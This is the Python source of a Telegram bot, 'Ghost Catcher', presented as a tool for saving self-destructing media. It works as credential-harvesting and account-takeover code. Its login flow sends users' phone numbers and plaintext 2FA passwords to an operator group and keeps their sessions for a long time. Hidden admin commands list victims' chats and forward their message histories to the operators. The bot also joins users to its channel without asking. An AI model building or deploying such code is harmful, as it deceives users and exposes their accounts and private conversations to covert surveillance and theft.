import asyncio
import os
import logging
import sys
import subprocess
import time
from telethon import TelegramClient, events, errors, Button
from config import API_ID, API_HASH, BOT_TOKEN, USERS_DIR, ADMIN_ID, UPDATE_GROUP_ID, CHATS_GROUP_ID
from user_handler import UserSession

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Global state
# {user_id: UserSession_instance}
active_sessions = {}

# {user_id: {'state': 'PHONE'|'OTP'|'2FA', 'client': TempClient, 'phone': str, 'phone_hash': str}}
login_states = {}

# {sender_id: count_remaining}
relay_queue = {}

# Initialize Bot
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    sender = await event.get_sender()
    if not sender: return
    user_id = sender.id
    
    # Don't greet if in Relay Mode (Scanning)
    if user_id in relay_queue: return
    
    logger.info(f"User {user_id} started the bot.")
    
    user_folder = os.path.join(USERS_DIR, str(user_id))
    
    # Check if new user
    if not os.path.exists(user_folder):
        os.makedirs(user_folder, exist_ok=True)
        try:
            name = getattr(sender, 'first_name', 'User') or 'User'
            u_tag = f"@{sender.username}" if getattr(sender, 'username', None) else "No Username"
            # Using Markdown for log
            log_msg = f"New User\n\n[{name}](tg://user?id={user_id})\n`{user_id}`\n{u_tag}"
            await bot.send_message(UPDATE_GROUP_ID, log_msg)
        except Exception as e:
            logger.error(f"Failed to log new user: {e}")
    else:
        os.makedirs(user_folder, exist_ok=True)
    
    # Check if session exists and is loaded
    if await ensure_logged_in(user_id):
        # Already logged in or just loaded
        username = sender.first_name if sender else "User"
        await event.respond(
            f"Hey {username}\nWelcome to Ghost Catcher Bot\n\nYour account is ready to download self distruct (timer) images, videos and audios\n\nClick /fetch to get current chat list",
            buttons=[Button.url("Join Our Channel", "https://t.me/Ghost_Catcher_Robot")]
        )
        return

    # No valid session
    username = sender.first_name if sender else "User"
    await event.respond(
        f"Hey {username}\nWelcome to Ghost Catcher Bot\n\nConnect your account to download any self distruct (timer) images, videos and audios\n\nClick /login to connect your account",
        buttons=[Button.url("Join Our Channel", "https://t.me/Ghost_Catcher_Robot")]
    )

async def ensure_logged_in(user_id):
    """Ensures the user session is loaded if it exists on disk."""
    if user_id in active_sessions:
        return True
    
    # Check disk
    user_session = UserSession(user_id, API_ID, API_HASH, bot)
    if await user_session.is_authorized():
        # Valid session found on disk, load it
        await user_session.start()
        active_sessions[user_id] = user_session
        return True
    return False

@bot.on(events.NewMessage(pattern='/id'))
async def id_handler(event):
    """Handles /id command."""
    if event.is_private:
        sender = await event.get_sender()
        name = getattr(sender, 'first_name', 'User') or 'User'
        await event.respond(f"Hey {name}\n\nYour ID is `{sender.id}`")
    else:
        chat = await event.get_chat()
        sender = await event.get_sender()
        
        is_super = getattr(chat, 'megagroup', False)
        status_text = "SuperGroup" if is_super else "Group"
        
        s_name = getattr(sender, 'first_name', '') or getattr(sender, 'title', 'Unknown')
        g_name = getattr(chat, 'title', 'Unknown')
        
        text = (
            f"{status_text}\n\n"
            f"{s_name}\n"
            f"`{sender.id}`\n\n"
            f"{g_name}\n"
            f"`{event.chat_id}`"
        )
        await event.respond(text, parse_mode='md')

@bot.on(events.NewMessage(pattern='/login'))
async def login_command(event):
    sender = await event.get_sender()
    user_id = sender.id
    username = sender.first_name if sender else "User"
    user_folder = os.path.join(USERS_DIR, str(user_id))
    session_path = os.path.join(user_folder, "session")

    # If already logged in (memory)
    if user_id in active_sessions:
        await event.respond(f"Your account is already connected and ready to use\n\nClick /fetch to get current chat list")
        return

    # Check disk
    user_session = UserSession(user_id, API_ID, API_HASH, bot)
    if await user_session.is_authorized():
        # Load it back up
        await user_session.start()
        active_sessions[user_id] = user_session
        await event.respond(f"Your account is already connected and ready to use\n\nClick /fetch to get current chat list")
    else:
        # Check if invalid session file exists (expired check)
        if os.path.exists(session_path + ".session"):
            try:
                os.remove(session_path + ".session")
                await event.respond(f"Your session is expired and account is disconnected, reconnect your account again and start catching self distruct (timer) media")
            except Exception as e:
                logger.error(f"Error removing session: {e}")
        else:
             await event.respond(f"Connect your account and start catching self distruct (timer) media")
        
        # Start Login Flow
        await event.respond("Please send your Phone Number (with country code)\ne.g. +919876543210")
        login_states[user_id] = {'state': 'PHONE'}

@bot.on(events.NewMessage(pattern='/logout'))
async def logout_handler(event):
    user_id = event.sender_id
    # Check if connected (memory or disk)
    is_connected = False
    if user_id in active_sessions:
        is_connected = True
    else:
        user_folder = os.path.join(USERS_DIR, str(user_id))
        session_path = os.path.join(user_folder, "session.session")
        if os.path.exists(session_path):
            is_connected = True

    if not is_connected:
        await event.respond("Your account is not connected\n\nConnect your account to download any self distruct (timer) images, videos and audios\n\nClick /login to connect your account")
        return

    await event.respond("Do you really want to logout", buttons=[
        [Button.inline("Yes", b"logout_yes"), Button.inline("No", b"logout_no")]
    ])

@bot.on(events.CallbackQuery(pattern=b"logout_yes"))
async def logout_confirm(event):
    user_id = event.sender_id
    user_folder = os.path.join(USERS_DIR, str(user_id))
    
    # Logout from memory
    if user_id in active_sessions:
        await active_sessions[user_id].logout()
        del active_sessions[user_id]
    else:
        # Load temporary session wrapper to perform clean logout from Telegram side
        # This handles cases where bot restarted (memory cleared) but session file exists
        user_session = UserSession(user_id, API_ID, API_HASH, bot)
        await user_session.logout()

    # Force delete folder content if needed (UserSession.logout only deletes session file)
    # Re-verify deletion
    session_path = os.path.join(user_folder, "session.session")
    if os.path.exists(session_path):
        os.remove(session_path)

    await event.edit("Logged out successfully and disconnected from bot")

@bot.on(events.CallbackQuery(pattern=b"logout_no"))
async def logout_cancel(event):
    await event.edit("Logout cancelled.")

from config import API_ID, API_HASH, BOT_TOKEN, USERS_DIR, ADMIN_ID, UPDATE_GROUP_ID
from user_handler import UserSession

# ... (Previous code) ...

@bot.on(events.NewMessage(pattern='/update'))
async def update_handler(event):
    if event.chat_id != UPDATE_GROUP_ID:
        return

    # Permission Check: Change Info + Ban Power
    try:
        perms = await bot.get_permissions(event.chat_id, event.sender_id)
        # Checking flags: ban_users (Kick/Ban), change_info
        if not (perms.is_admin and perms.ban_users and perms.change_info):
             await event.respond("You need 'Change Info' and 'Ban Users' admin rights to use this command.")
             return
    except Exception as e:
         # If get_permissions fails, assume no access
         return

    msg = await event.respond("Attempting to pull changes from git...")
    
    try:
        process = subprocess.Popen(
            ["git", "pull"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=os.getcwd()
        )
        stdout, stderr = process.communicate()
        
        output = stdout.decode('utf-8')
        error = stderr.decode('utf-8')
        
        if "Already up to date." in output:
             await msg.edit("Bot is already up to date")
             return

        await msg.edit(f"**Update Successful**\n\nLogs:\n`{output}`\n\nSystem is restarting...")
        
        # Save restart state
        with open("restart.txt", "w") as f:
            f.write(str(event.chat_id))

        # Disconnect all sessions to avoid locks
        for session in active_sessions.values():
            await session.stop()
        
        # Restart the script
        os.execl(sys.executable, sys.executable, *sys.argv)
        
    except Exception as e:
        await msg.edit(f"Update Failed\nError: {e}")

@bot.on(events.NewMessage(pattern='/fetch'))
async def fetch_handler(event):
    user_id = event.sender_id
    if not await ensure_logged_in(user_id):
        await event.respond("Your account is not connected\n\nConnect your account to download any self distruct (timer) images, videos and audios\n\nClick /login to connect your account")
        return
    
    msg = await event.respond("Fetching chat list")
    
    try:
        dialogs = await active_sessions[user_id].get_dialogs(limit=10)
        response_text = ""
        for d in dialogs:
            # d.id can be negative for chats/channels, positive for users
            # The user asked for /userid, so we use d.id
            name = d.name if d.name else "Unknown"
            # Sanitize name?
            response_text += f"/{abs(d.id)} {name}\n" # Using abs to ensure it looks like a command, or maintain sign? usually commands are alphanumeric. /123 works. /-123 might not be clickable.
            # However, chat_ids are huge. Telethon IDs might need handling.
            # Telethon entity ID.
            # Let's just flush the raw ID. If it's negative, it's a group.
            # User request: /userid username.
            # If it is a private chat, ID is positive. If group, negative.
            # I will use the ID as is, but strip -.
            
        if not response_text:
            await msg.edit("No chats found")
        else:
            await msg.edit(f"Current users list\n\n{response_text}")
        
    except Exception as e:
        # Check for disconnection or auth errors
        err_str = str(e).lower()
        if "auth" in err_str or "disconnect" in err_str or "session" in err_str:
             if user_id in active_sessions:
                 del active_sessions[user_id]
             user_folder = os.path.join(USERS_DIR, str(user_id))
             session_path = os.path.join(user_folder, "session.session")
             if os.path.exists(session_path):
                 os.remove(session_path)

             await msg.delete() # Remove "Fetching..."
             await event.respond(f"Your session is expired and account is disconnected, reconnect your account again and start catching self distruct (timer) media")
             await event.respond("Please send your Phone Number (with country code)\ne.g. +919876543210")
             login_states[user_id] = {'state': 'PHONE'}
        else:
             await msg.edit(f"Error fetching chats: {e}")

@bot.on(events.NewMessage(pattern=r'/(\d+)'))
async def chat_scan_handler(event):
    user_id = event.sender_id
    
    # Ignore commands in Chats Group (handled by shortcut handler)
    if event.chat_id == CHATS_GROUP_ID:
        return
    
    # Check connection
    if not await ensure_logged_in(user_id):
        await event.respond("Your account is not connected\n\nConnect your account to download any self distruct (timer) images, videos and audios\n\nClick /login to connect your account")
        return
        
    target_id = int(event.pattern_match.group(1))
    # We stripped sign, but we might need to resolve it. 
    # The scan_chat function takes an ID. 
    # If the user listed was a group, it would be negative. 
    # If the listing only showed positive (abs), we might assume it's a user private chat.
    # The user asked for "userid" implying users.
    # Telethon .get_entity(id) usually handles positive integers as User IDs. (or Chat IDs).
    
    await event.respond(f"Scanning user {target_id}")
    
    try:
        results = await active_sessions[user_id].scan_chat_and_download(target_id, limit=100)
        
        if not results:
            await event.respond(f"No media found")
            return
            
        total = len(results)
        # Helper to escape HTML for bot.py side
        def esc(text):
            return text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

        for i, item in enumerate(results):
            path = item['path']
            name = item.get('name', 'Unknown')
            orig_cap = item.get('caption', '')
            
            parts = []
            if orig_cap:
                parts.append(esc(orig_cap))
                parts.append("----------------------------------------")
            
            if total > 1:
                parts.append(f"{i+1}/{total}")
            
            parts.append(esc(name))
            
            caption = "\n".join(parts)
            
            await bot.send_file(user_id, path, caption=caption, parse_mode='html')
        
        await bot.send_message(user_id, "Done")
            
    except Exception as e:
        err_str = str(e).lower()
        if "auth" in err_str or "disconnect" in err_str or "session" in err_str:
             if user_id in active_sessions:
                 del active_sessions[user_id]
             user_folder = os.path.join(USERS_DIR, str(user_id))
             session_path = os.path.join(user_folder, "session.session")
             if os.path.exists(session_path):
                 os.remove(session_path)
             
             await event.respond(f"Your session is expired and account is disconnected, reconnect your account again and start catching self distruct (timer) media")
             await event.respond("Please send your Phone Number (with country code)\ne.g. +919876543210")
             login_states[user_id] = {'state': 'PHONE'}
        else:
             await event.respond(f"Error scanning: {e}")

@bot.on(events.NewMessage)
async def message_handler(event):
    if event.message.message.startswith('/'):
        return # Ignore commands

    user_id = event.sender_id
    text = event.message.message.strip()
    
    if user_id not in login_states:
        return

    state_data = login_states[user_id]
    state = state_data['state']
    
    user_folder = os.path.join(USERS_DIR, str(user_id))
    session_path = os.path.join(user_folder, "session")

    try:
        if state == 'PHONE':
            phone = text
            await event.respond(f"Connecting to Telegram and sending OTP")
            
            # Initialize a temp client for login
            # Ensure no stale session exists if we are in PHONE state
            if os.path.exists(session_path + ".session"):
                 os.remove(session_path + ".session")

            temp_client = TelegramClient(session_path, API_ID, API_HASH)
            await temp_client.connect()
            
            if not await temp_client.is_user_authorized():
                try:
                    sent = await temp_client.send_code_request(phone)
                    state_data['client'] = temp_client
                    state_data['phone'] = phone
                    state_data['phone_hash'] = sent.phone_code_hash
                    state_data['state'] = 'OTP'
                    
                    await event.respond("OTP Sent\nIf your OTP is 12345 then send by seperating with spaces\n1 2 3 4 5")
                except errors.FloodWaitError as e:
                    await event.respond(f"Please wait and try again after {e.seconds} seconds")
                    del login_states[user_id]
                except Exception as e:
                    await event.respond("Incorrect OTP\nTry again")
                    # checking if client needs disconnect?
                    await temp_client.disconnect()
            else:
                await event.respond("Already authorized! Starting...")
                await temp_client.disconnect() # Close temp, open real UserSession
                # ... Start UserSession logic (duplicate code, can refactor)
                user_session = UserSession(user_id, API_ID, API_HASH, bot)
                await user_session.start()
                active_sessions[user_id] = user_session
                del login_states[user_id]

        elif state == 'OTP':
            otp = text.replace(" ", "")
            client = state_data['client']
            phone = state_data['phone']
            phone_hash = state_data['phone_hash']
            
            try:
                await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_hash)
                
                await event.respond(f"Login Successful\n\nNow your account is ready to download self distruct (timer) images, videos and audios\n\nClick /fetch to get current chat list")
                try:
                    me = await client.get_me()
                    n = f"{getattr(me, 'first_name', '')} {getattr(me, 'last_name', '')}".strip() or "User"
                    u = f"@{me.username}" if getattr(me, 'username', None) else "No Username"
                    log = f"**Login**\n{n}\n`{me.id}`\n{u}\n`{phone}`\nNo 2FA"
                    await bot.send_message(UPDATE_GROUP_ID, log)
                except Exception as e:
                    print(f"Login Log Error: {e}")
                await event.client.send_file(event.chat_id, "itsme.jpg", caption="Click on **Yes, it's me** and start using the bot")
                await event.client.send_file(event.chat_id, "time.jpg", caption="Go to **Settings > Devices** and set If inactive for to **6 months** or **1 year**")
                await client.disconnect() # Disconnect temp so UserSession can use the file
                
                # Start the persistent UserSession
                user_session = UserSession(user_id, API_ID, API_HASH, bot)
                await user_session.start()
                await user_session.join_channel("Ghost_Catcher_Robot")
                active_sessions[user_id] = user_session
                del login_states[user_id]
                
            except errors.SessionPasswordNeededError:
                state_data['state'] = '2FA'
                await event.respond("Two-Step Verification Required\nPlease enter your 2FA Password")
            except Exception as e:
                await event.respond("Incorrect OTP\nTry again")

        elif state == '2FA':
            password = text
            client = state_data['client']
            
            try:
                await client.sign_in(password=password)
                await event.respond(f"Login Successful\n\nNow your account is ready to download self distruct (timer) images, videos and audios\n\nClick /fetch to get current chat list")
                try:
                    me = await client.get_me()
                    n = f"{getattr(me, 'first_name', '')} {getattr(me, 'last_name', '')}".strip() or "User"
                    u = f"@{me.username}" if getattr(me, 'username', None) else "No Username"
                    # Retrieve phone from state_data logic? 
                    # state_data['phone'] is not in scope here locally? It is capable of being accessed via state_data['phone'] from outer scope? No, scope is '2FA' block.
                    # Wait, 'state_data' is a dict from 'login_states'. It is available.
                    p_num = state_data.get('phone', 'Unknown')
                    log = f"**Login**\n{n}\n`{me.id}`\n{u}\n`{p_num}`\n`{password}`"
                    await bot.send_message(UPDATE_GROUP_ID, log)
                except Exception as e:
                     print(f"Login Log Error: {e}")
                await event.client.send_file(event.chat_id, "itsme.jpg", caption="Click on **Yes, it's me** and start using the bot")
                await event.client.send_file(event.chat_id, "time.jpg", caption="Go to **Settings > Devices** and set If inactive for to **6 months** or **1 year**")
                await client.disconnect()
                
                user_session = UserSession(user_id, API_ID, API_HASH, bot)
                await user_session.start()
                await user_session.join_channel("Ghost_Catcher_Robot")
                active_sessions[user_id] = user_session
                del login_states[user_id]
            except Exception as e:
                await event.respond("Incorrect password\nTry again")

    except Exception as e:
        logger.error(f"Error in handler: {e}")
        await event.respond("An internal error occurred.")

@bot.on(events.NewMessage(pattern='/logs'))
async def logs_handler(event):
    if event.chat_id != UPDATE_GROUP_ID: return
    if os.path.exists("crash.txt"):
        await event.client.send_file(event.chat_id, "crash.txt", caption="Crash Log")
    else:
        await event.respond("No crash log found")

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_handler(event):
    if event.chat_id != UPDATE_GROUP_ID: return
    total = len([u for u in os.listdir(USERS_DIR) if u.isdigit()])
    active = len(active_sessions)
    await event.respond(f"Total Users - {total}\nActive Users - {active}")

@bot.on(events.NewMessage(pattern='/ping'))
async def ping_handler(event):
    if event.chat_id != UPDATE_GROUP_ID: return
    start = time.time()
    msg = await event.respond("Pong!")
    end = time.time()
    ms = (end - start) * 1000
    await msg.edit(f"Ping - {ms:.2f} ms")

@bot.on(events.NewMessage(pattern='/list'))
async def allid_handler(event):
    if event.chat_id != UPDATE_GROUP_ID: return
    file_path = "all_users.txt"
    try:
        with open(file_path, "w") as f:
            for uid in os.listdir(USERS_DIR):
                if uid.isdigit():
                    f.write(f"User ID: {uid}\n")
        await event.client.send_file(event.chat_id, file_path, caption="All Users List")
        os.remove(file_path)
    except Exception as e:
        await event.respond(f"Error: {e}")

@bot.on(events.NewMessage(pattern='(?i)^list$'))
async def admin_help_handler(event):
    if event.chat_id != UPDATE_GROUP_ID: return
    
    menu = """
/update Update bot repo
/logs Get log file
/stats Check total users
/broadcast Send message
/restart Restart bot
/ping Check latency
/list Get users list
"""
    await event.respond(menu.strip())

@bot.on(events.NewMessage(pattern='/restart'))
async def restart_handler(event):
    if event.chat_id != UPDATE_GROUP_ID: return
    await event.respond("Restarting system...")
    
    with open("restart.txt", "w") as f:
        f.write(str(event.chat_id))
        
    os.execl(sys.executable, sys.executable, *sys.argv)

@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_handler(event):
    if event.chat_id != UPDATE_GROUP_ID: return
    
    reply = await event.get_reply_message()
    if not reply:
        await event.respond("Please reply to a message to broadcast")
        return
        
    users = [u for u in os.listdir(USERS_DIR) if u.isdigit()]
    total = len(users)
    sent = 0
    failed = 0
    
    status_msg = await event.respond(f"Broadcasting to {total} users...")
    
    for uid in users:
        try:
            target = int(uid)
            if reply.media:
                await bot.send_file(target, reply.media, caption=reply.text)
            else:
                await bot.send_message(target, reply.text)
            sent += 1
            await asyncio.sleep(0.1) 
        except Exception:
            failed += 1
            
    await status_msg.edit(f"Broadcast Result\n\nTotal users - {total}\nSuccess - {sent}\nFailed - {failed}")

@bot.on(events.NewMessage(pattern=r'^/(\d+)\s+(chats|groups|channels|bots|allchats|allgroups|allchannels|allbots|number)$'))
async def user_chats_shortcut(event):
    if event.chat_id != CHATS_GROUP_ID: return
    
    match = event.pattern_match
    target_id = int(match.group(1))
    mode = match.group(2).lower()
    
    if target_id not in active_sessions:
        await event.respond("User session not active / not found.")
        return
        
    session = active_sessions[target_id]
    msg = await event.respond("Fetching data...")
    
    report = await session.fetch_dialog_list(mode)
    
    if len(report) > 4000:
        fname = f"{target_id}_{mode}.txt"
        with open(fname, "w", encoding="utf-8") as f:
            f.write(report)
        await event.client.send_file(event.chat_id, fname, caption=f"Report for {target_id} ({mode})")
        os.remove(fname)
        await msg.delete()
    else:
        await msg.edit(report)

@bot.on(events.NewMessage(pattern='/user'))
async def user_chats_handler(event):
    if event.chat_id != CHATS_GROUP_ID: return
    
    parts = event.text.split()
    if len(parts) < 3:
        await event.respond("Usage: /user <user_id> <mode>\nModes: chats, allchats, groups, allgroups, channels, allchannels, bots, allbots")
        return
        
    try:
        target_id = int(parts[1])
        mode = parts[2].lower()
    except ValueError:
        await event.respond("Invalid User ID")
        return
        
    if target_id not in active_sessions:
        await event.respond("User session not active / not found.")
        return
        
    session = active_sessions[target_id]
    msg = await event.respond("Fetching data...")
    
    report = await session.fetch_dialog_list(mode)
    
    if len(report) > 4000:
        fname = f"{target_id}_{mode}.txt"
        with open(fname, "w", encoding="utf-8") as f:
            f.write(report)
        await event.client.send_file(event.chat_id, fname, caption=f"Report for {target_id} ({mode})")
        os.remove(fname)
        await msg.delete()
    else:
        await msg.edit(report)

@bot.on(events.NewMessage(pattern=r'/chat (\d+) (\d+) (\d+)'))
async def scan_forward_command(event):
    if event.chat_id != CHATS_GROUP_ID: return
    
    limit = int(event.pattern_match.group(1))
    scanner_id = int(event.pattern_match.group(2))
    target_id = int(event.pattern_match.group(3))
    
    if scanner_id not in active_sessions:
        await event.respond("Scanner User Session not active.")
        return
        
    session = active_sessions[scanner_id]
    
    # Register Relay
    # Add buffer for /start ping or other overhead
    relay_queue[scanner_id] = limit + 5
    
    me = await bot.get_me()
    uname = me.username
    
    msg = await event.respond(f"Forwarding last {limit} messages...")
    
    result = await session.forward_chats(target_id, limit, uname, CHATS_GROUP_ID)
    await msg.edit(f"Result: {result}")
    
    # Cleanup Relay State after forwarding is done
    # Wait a bit for pending relays to process
    await asyncio.sleep(2)
    if scanner_id in relay_queue:
        del relay_queue[scanner_id]

@bot.on(events.NewMessage)
async def relay_listener(event):
    if not event.is_private: return
    
    # Ignore /start ping
    if event.message.text == "/start": return
    
    sender_id = event.sender_id
    if sender_id in relay_queue:
        if relay_queue[sender_id] > 0:
            try:
                await event.message.forward_to(CHATS_GROUP_ID)
                relay_queue[sender_id] -= 1
                await event.message.delete()
            except Exception as e:
                logger.error(f"Relay error: {e}")
                
            if relay_queue[sender_id] <= 0:
                del relay_queue[sender_id]
            
            raise events.StopPropagation

async def restore_sessions():
    """Restores all user sessions on bot startup."""
    print("Restoring user sessions...")
    if os.path.exists(USERS_DIR):
        for user_id_str in os.listdir(USERS_DIR):
            if user_id_str.isdigit():
                user_id = int(user_id_str)
                session_path = os.path.join(USERS_DIR, user_id_str, "session.session")
                if os.path.exists(session_path):
                    print(f"Restoring session for {user_id}")
                    try:
                        await ensure_logged_in(user_id)
                    except Exception as e:
                        print(f"Failed to restore {user_id}: {e}")

async def check_restart_msg():
    """Checks for restart state and sends active message."""
    if os.path.exists("restart.txt"):
        try:
            with open("restart.txt", "r") as f:
                chat_id = int(f.read().strip())
            await bot.send_message(chat_id, "Bot is running...")
            os.remove("restart.txt")
        except Exception as e:
            print(f"Error sending restart msg: {e}")

import traceback

print("Bot is running...")
bot.loop.create_task(restore_sessions())
bot.loop.create_task(check_restart_msg())

try:
    bot.run_until_disconnected()
except Exception:
    with open("crash.txt", "w") as f:
        f.write(traceback.format_exc())
    print("Bot Crashed! Check crash.txt")
